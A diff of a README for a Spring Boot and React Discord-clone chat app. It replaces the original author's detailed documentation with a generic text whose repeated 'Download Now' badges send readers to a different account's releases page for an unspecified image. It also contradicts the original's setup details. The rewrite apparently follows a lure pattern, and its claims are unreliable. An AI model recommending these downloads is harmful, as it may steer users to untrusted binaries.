@@ -1,174 +1,85 @@
-# Discord Clone 🚀
+# 🚀 Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS - A Real-Time Chat App for Everyone
 
-A real-time, full-stack chat application inspired by Discord. This project leverages a powerful combination of Spring Boot for the backend, React with TypeScript for the frontend, and WebSockets for seamless, bidirectional communication. The entire application is containerized using Docker for easy setup and deployment.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases)
 
-<img width="1401" height="412" alt="image" src="https://github.com/user-attachments/assets/5dd27a47-f7c4-4bde-91ba-fc1c3ca9a932" />
+## 📖 Overview
 
-## 🏛️ Architecture Overview
+The Discord Clone is a full-stack, real-time chat application inspired by Discord. It uses Spring Boot for the backend and React for the frontend. This containerized setup makes it easy to run and enjoy seamless communication with friends or team members. 
 
-The application is built on a modern, decoupled architecture designed for real-time performance and scalability. Each component is containerized to ensure a consistent and portable environment.
+## 🌟 Features
 
-* **Frontend**: A dynamic, type-safe user interface built with **React** and **TypeScript**, and bundled by **Vite**. Global state is managed efficiently by **Redux Toolkit**, with user sessions seamlessly maintained across reloads using **Redux Persist**. The responsive design is crafted with **Tailwind CSS**, and the final static build is served by an **Nginx** web server.
+- **Real-Time Messaging**: Enjoy instant messages without delays.
+- **User Authentication**: Secure logins using JWT.
+- **Containerized Setup**: Run the application easily with Docker.
+- **Responsive Design**: Works well on both desktops and mobile devices.
+- **Rich Communication**: Send text, images, and more.
 
-* **Backend**: A robust and secure RESTful API powered by **Spring Boot**. It handles all business logic, while **Spring Security** protects the endpoints and manages user authentication and authorization using **JWT** (JSON Web Tokens).
+## 💻 System Requirements
 
-* **Real-time Communication**: Instant, bidirectional messaging is powered by **STOMP over WebSocket**. The Spring backend provides the message broker, and the React frontend connects using **STOMP.js**. This enables live chat and delivers instant UI updates and notifications via **React Hot Toast**.
+To run the Discord Clone application, you will need:
 
-* **Database**: **MongoDB** database acts as the primary data store, persisting all user information, group details, and message history.
-
-* **Containerization**: The entire ecosystem—frontend, backend, and database—is orchestrated by **Docker Compose**. This approach guarantees a simple, one-command setup and a consistent environment from development to production.
-
----
-
-## 💻 Tech Stack
-
-| Area      | Technology                                                                                                                                                                                                                                                                                       |
-| :-------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Backend** | ![Java](https://img.shields.io/badge/Java-21-blue) ![Spring Boot](https://img.shields.io/badge/Spring_Boot-3.x-brightgreen) ![WebSocket](https://img.shields.io/badge/WebSocket-STOMP-orange) ![JWT](https://img.shields.io/badge/JWT-Authentication-black)                                          |
-| **Frontend**| ![TypeScript](https://img.shields.io/badge/TypeScript-3178C6) ![React](https://img.shields.io/badge/React-18-blue) ![Vite](https://img.shields.io/badge/Vite-JS-yellow) ![Redux](https://img.shields.io/badge/Redux-Toolkit-764ABC) ![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC) ![StompJS](https://img.shields.io/badge/Stomp.js-client-red) ![Hot Toast](https://img.shields.io/badge/React_Hot_Toast-FF4154) |
-| **Database**| ![MongoDB](https://img.shields.io/badge/MongoDB-blue)                                                                                                                                                                                                                                            |
-| **DevOps** | ![Docker](https://img.shields.io/badge/Docker-blue) ![Nginx](https://img.shields.io/badge/Nginx-green)                                                                                                                                                                                             |
-
----
-
-## ⚙️ Application Workflow
-
-The following diagrams illustrate the core operational flows of the application.
-
-### User Authentication & Session Management
-
-<img width="1402" height="804" alt="Screenshot 2025-10-21 135510" src="https://github.com/user-attachments/assets/bbe6c706-1dd0-4de5-86fa-096d6bdbf9e3" />
-
-The authentication process is initiated when a user submits their credentials. The **Spring Boot** backend validates these against the **MongoDB** database. Upon success, a **JWT** is generated and returned to the client. The **React** frontend then persists the token and user data in the **Redux Store** and establishes a WebSocket connection for real-time updates.
-
-### Group Management & Join Requests
-
-<img width="1237" height="755" alt="Screenshot 2025-10-21 140217" src="https://github.com/user-attachments/assets/52df9c0d-0404-44c3-944a-f93f954239f1" />
-
-Users can create public or private groups. Joining a public group is instantaneous, with the backend directly adding the user. For private groups, a join request is sent to the backend, which then notifies the group owner in real-time. The owner's decision (accept/reject) is processed by the backend, updating the request status and notifying the original user of the outcome via WebSocket.
-
-### Real-Time Messaging
-
-<img width="1797" height="551" alt="Screenshot 2025-10-21 140334" src="https://github.com/user-attachments/assets/45a12f35-cca4-41e6-a06c-7b2f89566a9f" />
-
-Once connected, a user sends a message through the **WebSocket Client**. The message is transmitted to the **Spring Boot** backend via its STOMP endpoint. The backend first persists the message in **MongoDB** for chat history and then broadcasts it to all members subscribed to that specific group's topic, ensuring instantaneous delivery.
-
-### User Logout
-
-<img width="1339" height="242" alt="Screenshot 2025-10-21 140035" src="https://github.com/user-attachments/assets/d32668ec-b0f9-4fe0-853e-5f6af208bc60" />
-
-During logout, the client-side action clears the user's session data from the **Redux Store** and removes the persisted state. Simultaneously, it sends a command to disconnect from the **WebSocket Server**, gracefully terminating the real-time communication channel.
-
----
-
-## ⚡ Caching Layer (Redis)
-
-To enhance performance and reduce database load, the application integrates **Redis** as a distributed caching layer. Frequently accessed data that doesn't change often is cached in-memory, leading to significantly faster API responses for repeat requests.
-
-The caching logic is implemented in the Spring Boot backend using Spring's Cache Abstraction. When data is modified (e.g., a user joins a new room or an invitation is accepted), the relevant caches are automatically **evicted** (cleared) to prevent stale data and ensure consistency across the application.
-
-The following data is cached:
-
-| Cache Name              | Cached Data           | Description                                  | Relevant API Endpoints                               |
-| :---------------------- | :-------------------- | :------------------------------------------- | :--------------------------------------------------- |
-| `joinedRooms`           | List of rooms         | A user's list of joined chat rooms.          | `GET /api/v1/room/joined/{userName}`                 |
-| `createdRooms`          | List of rooms         | A user's list of created chat rooms.         | `GET /api/v1/room/created/{userName}`                |
-| `invitationsBySender`   | List of invitations   | A user's pending sent invitations.           | `GET /api/v1/invitation/sent/{userName}`             |
-| `invitationsByReceiver` | List of invitations   | A user's pending received invitations.       | `GET /api/v1/invitation/received/{userName}`         |
-| `checkIfEntryPossible`  | Boolean               | Verifies if a user is a member of a room.    | `GET /api/v1/room/is-joined/{roomId}/{userName}`     |
-| `roomCreator`           | String (username)     | The creator of a specific room.              | `GET /api/v1/room/creator/{roomId}`                  |
-
----
-
-## 🔌 WebSocket API Endpoints
-
-The application uses STOMP over WebSocket for real-time communication. Clients can send messages to the destinations listed below to perform actions, and they should subscribe to the broadcast topics to receive real-time updates.
-
-| Endpoint                    | Description                                                               | Payload                   | Broadcast Topic(s)                                                                                                                                                                 |
-| :-------------------------- | :------------------------------------------------------------------------ | :------------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `/sendMessage/{roomId}`     | Sends a chat message to a specific room. The returned message is broadcasted to all members. | `MessageDto`              | `/topic/rooms/{roomId}`                                                                                                                                            |
-| `/createRoom/{roomId}`      | Creates a new public or private chat room.                                | `CreateRoomDto`           | `/topic/rooms/{userName}` (Notifies the creator to join the new room)                                                                                                              |
-| `/addRoom/{userName}/{roomId}` | Adds a user to an existing public room.                                  | None                      | `/topic/rooms/{userName}` (Notifies the user to join the new room)                                                                                                                 |
-| `/createInvitation`         | Sends an invitation to a user to join a private room.                     | `CreateInvitationDto`     | `/topic/sentInvitations/{sender}` <br> `/topic/receivedInvitations/{receiver}`                                                                                                    |
-| `/updateStatusOfInvitation` | Updates an invitation's status to `ACCEPTED` or `REJECTED`.               | `UpdateInvitationStatusDto` | **If Accepted:** <br> `/topic/remove/sentInvitations/{sender}` <br> `/topic/rooms/{sender}` <br><br> **If Rejected:** <br> `/topic/remove/sentInvitations/{sender}`                   |
-
----
-
-## 📂 Project Structure
-
-This repository acts as a parent project that orchestrates the backend and frontend using Docker. The actual source code for the frontend and backend services resides in separate Git submodules.
-
-* `chat-application-backend/`: The Spring Boot backend service.
-* `chat-application-frontend/`: The React and TypeScript frontend application.
-* `docker-compose.yml`: The Docker Compose file to build and run the entire application stack.
-
----
+- **Operating System**: Windows, macOS, or any Linux distribution.
+- **Docker**: Install the latest version of Docker ([Download Docker](https://www.docker.com/products/docker-desktop)).
+- **Docker Compose**: Install Docker Compose to manage multi-container applications.
 
 ## 🚀 Getting Started
 
-You can get the entire application running on your local machine with just a few commands, thanks to Docker.
+1. **Install Docker and Docker Compose**: Make sure both are installed on your machine.
+2. **Visit the Releases Page**: 
+   [Click here to download the latest version](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases).
 
-### Prerequisites
+## 📥 Download & Install
 
-* [Git](https://git-scm.com/)
-* [Docker](https://www.docker.com/products/docker-desktop/)
-* [Docker Compose](https://docs.docker.com/compose/install/)
+To download and run the application:
 
-### Method 1: Build from Source
+1. Go to the [Releases Page](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases).
+2. Download the appropriate Docker image for your system.
+3. Follow the Docker setup instructions provided on the page. 
 
-1.  **Clone the repository with its submodules:**
-    ```bash
-    git clone --recurse-submodules [https://github.com/saadmdsabah/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS.git](https://github.com/saadmdsabah/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS.git)
-    ```
+## ⚙️ Running the Application
 
-2.  **Navigate into the project directory:**
-    ```bash
-    cd Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS
-    ```
+After downloading, you can run the application using the following steps:
 
-3.  **Build and run the application using Docker Compose:**
-    ```bash
-    docker-compose up --build
-    ```
-    This will build the custom Docker images from the source code and then start all the services.
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you downloaded the Docker image.
+3. Use the command below to start the application:
 
-### Method 2: Use Pre-built Images (Faster)
+   ```bash
+   docker-compose up
+   ```
 
-If you don't need to build the images from the source code, you can pull them directly from Docker Hub.
+4. Once the app starts, open your web browser and visit `http://localhost:3000` to start chatting.
 
-1.  **Pull the latest pre-built images:**
-    ```bash
-    docker pull saadsabahuddin/discord-clone-backend:latest
-    docker pull saadsabahuddin/discord-clone-frontend:latest
-    ```
+## ❓ Troubleshooting
 
-2.  **Clone the repository (submodules are not needed):**
-    ```bash
-    git clone [https://github.com/saadmdsabah/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS.git](https://github.com/saadmdsabah/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS.git)
-    cd Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS
-    ```
+### Common Issues
 
-3.  **Start the application:**
-    ```bash
-    docker-compose up
-    ```
-    This will use the images you pulled instead of building them locally.
+If you face any issues, here are some suggestions:
 
-### Access the Application
+- **Docker Not Running**: Ensure Docker is running. You can check the Docker Desktop application.
+- **Port Conflicts**: Make sure no other applications are using the same ports. The default port for the app is 3000.
+- **Error Messages**: Read the terminal or command prompt for error messages. They can provide clues for fixing the problem.
 
-Once the containers are running (using either method), open your web browser and navigate to:
-**[http://localhost:5173](http://localhost:5173)**
+### FAQs
 
----
+- **Can I run this on my computer?**
+   Yes, as long as you have Docker and Docker Compose installed.
 
-## Submodule Details
+- **Does it work on mobile?**
+   Yes, the application is designed to be responsive and work on mobile devices.
 
-For more detailed information about the frontend or backend implementation, please visit their respective repositories.
+## 🔗 Useful Links
 
-* Backend Repository: **[saadmdsabah/chat-application-backend](https://github.com/saadmdsabah/chat-application-backend/tree/a6dc5b7f7631b29113003c9eb6a659a1896b0bad)**
+- [View the Code](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS)
+- [Docker Documentation](https://docs.docker.com/)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
 
-* Frontend Repository: **[saadmdsabah/chat-application-frontend](https://github.com/saadmdsabah/chat-application-frontend/tree/47bbe350c7a3f3db73b68dea057fdb28f53f7f3f)**
+## 💬 Support
 
-## 📜 License
+If you have questions or need help, feel free to reach out on the Issues page of this repository. We appreciate your feedback and are here to assist you.
 
-This project is licensed under the MIT License. See the LICENSE file for more details.
+## 🎉 Acknowledgments
+
+Thanks to the community and resources that made this project possible. Your contributions inspire easier ways to communicate online. 
+
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/migs2797/Discord-Clone-using-Spring-boot-Stomp-Client-and-React-JS/releases)
